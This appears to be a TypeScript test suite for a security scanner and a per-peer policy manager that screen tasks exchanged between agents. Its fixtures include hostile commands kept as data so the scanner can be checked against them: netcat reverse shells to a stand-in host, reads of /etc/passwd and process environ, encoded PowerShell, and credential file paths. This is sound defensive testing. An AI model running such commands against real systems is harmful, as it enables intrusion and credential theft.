import { describe, it, beforeEach } from "node:test";
import assert from "node:assert/strict";
import { TaskScanner } from "../src/lib/security/scanner";
import { TaskPolicyManager } from "../src/lib/security/policy";
import type { AgentId, TaskRequest } from "../src/types/protocol";

const WORKER = "agent:org1:worker" as AgentId;
const PEER_A = "agent:org2:alice" as AgentId;
const PEER_B = "agent:org3:bob" as AgentId;

function makeTask(
  description: string,
  input: Record<string, unknown> = {},
  type = "code_review"
): TaskRequest {
  return {
    task_id: "task_security_edge",
    type,
    description,
    input,
  };
}

describe("TaskScanner edge cases", () => {
  let scanner: TaskScanner;

  beforeEach(() => {
    scanner = new TaskScanner();
  });

  it("detects auth file names that commonly contain tokens", () => {
    const result = scanner.scan(makeTask("Inspect auth setup", {
      files: ["~/.npmrc", "/home/user/.netrc"],
    }));

    assert.equal(result.safe, false);
    assert.ok(result.threats.some((t) => t.pattern === ".npmrc auth file"));
    assert.ok(result.threats.some((t) => t.pattern === ".netrc auth file"));
  });

  it("detects sensitive environment variable names in object keys", () => {
    const result = scanner.scan(makeTask("Normalize environment config", {
      env: {
        AWS_SECRET_ACCESS_KEY: "redacted",
      },
    }));

    assert.equal(result.safe, false);
    assert.ok(result.threats.some((t) => t.pattern === "sensitive environment variable"));
    assert.ok(result.threats.some((t) => t.location === "input.env.AWS_SECRET_ACCESS_KEY"));
  });

  it("detects direct reads of system account and process environment files", () => {
    const result = scanner.scan(makeTask("Collect diagnostics", {
      commands: ["cat /etc/passwd", "cat /proc/self/environ"],
    }));

    assert.equal(result.safe, false);
    assert.ok(result.threats.some((t) => t.pattern === "/etc/passwd"));
    assert.ok(result.threats.some((t) => t.pattern === "process environment file"));
  });

  it("detects shell -c and PowerShell encoded command execution", () => {
    const result = scanner.scan(makeTask("Run these commands", {
      commands: [
        "bash -c 'id'",
        "powershell -EncodedCommand SQBFAFgA",
      ],
    }, "run_tests"));

    assert.equal(result.safe, false);
    assert.ok(result.threats.some((t) => t.pattern === "shell -c execution"));
    assert.ok(result.threats.some((t) => t.pattern === "PowerShell encoded command"));
  });

  it("detects nc, ncat, and netcat reverse shell forms", () => {
    const result = scanner.scan(makeTask("Check socket commands", {
      commands: [
        "nc -e /bin/sh attacker.test 4444",
        "ncat -lp 4444 -e /bin/sh",
        "netcat -v attacker.test 443",
      ],
    }));

    assert.equal(result.safe, false);
    assert.ok(result.threats.some((t) => t.pattern === "netcat reverse shell"));
  });

  it("does not flag documentation-only .env example names", () => {
    const result = scanner.scan(makeTask("Document how config/.env.example is structured", {
      file: "docs/env-example.md",
    }));

    assert.equal(result.safe, true);
    assert.equal(result.threats.length, 0);
  });
});

describe("TaskPolicyManager edge cases", () => {
  let manager: TaskPolicyManager;

  beforeEach(() => {
    manager = new TaskPolicyManager(WORKER);
  });

  it("treats an empty allowed_types list as deny all", () => {
    manager.updatePolicy({ allowed_types: [] });

    const result = manager.checkTask(PEER_A, makeTask("Review this file"));

    assert.equal(result.allowed, false);
    assert.match(result.reason ?? "", /not in allowed types/);
  });

  it("keeps per-peer overrides isolated from other peers and removable", () => {
    manager.updatePolicy({ allowed_types: ["code_review"] });
    manager.setPeerOverride(PEER_A, { allowed_types: ["generate"] });

    const peerAResult = manager.checkTask(PEER_A, makeTask("Generate output", {}, "generate"));
    const peerBResult = manager.checkTask(PEER_B, makeTask("Generate output", {}, "generate"));
    manager.removePeerOverride(PEER_A);
    const removedResult = manager.checkTask(PEER_A, makeTask("Generate output", {}, "generate"));

    assert.equal(peerAResult.allowed, true);
    assert.equal(peerBResult.allowed, false);
    assert.equal(removedResult.allowed, false);
  });

  it("matches blocked paths on path boundaries only", () => {
    manager.updatePolicy({
      allowed_types: ["code_review"],
      blocked_paths: ["/workspace/secret", ".env"],
    });

    const blocked = manager.checkTask(PEER_A, makeTask("Review a file", {
      file: "/workspace/secret/config.json",
    }));
    const similarName = manager.checkTask(PEER_A, makeTask("Review a file", {
      file: "/workspace/secretary/config.json",
    }));
    const envExample = manager.checkTask(PEER_A, makeTask("Review a sample env file", {
      file: "config/.env.example",
    }));

    assert.equal(blocked.allowed, false);
    assert.equal(similarName.allowed, true);
    assert.equal(envExample.allowed, true);
  });

  it("returns policy copies so callers cannot mutate manager state", () => {
    const returned = manager.getPolicy();
    returned.allowed_types.length = 0;
    returned.blocked_paths.length = 0;

    const result = manager.checkTask(PEER_A, makeTask("Review this file"));
    const current = manager.getPolicy();

    assert.equal(result.allowed, true);
    assert.ok(current.allowed_types.length > 0);
    assert.ok(current.blocked_paths.length > 0);
  });

  it("keeps scan_only scoped to the peer override", () => {
    manager.setPeerOverride(PEER_A, { scan_only: true });

    const peerAResult = manager.checkTask(PEER_A, makeTask("Read ~/.ssh/id_rsa"));
    const peerBResult = manager.checkTask(PEER_B, makeTask("Read ~/.ssh/id_rsa"));

    assert.equal(peerAResult.allowed, true);
    assert.equal(peerAResult.scan_only, true);
    assert.equal(peerBResult.allowed, false);
  });
});
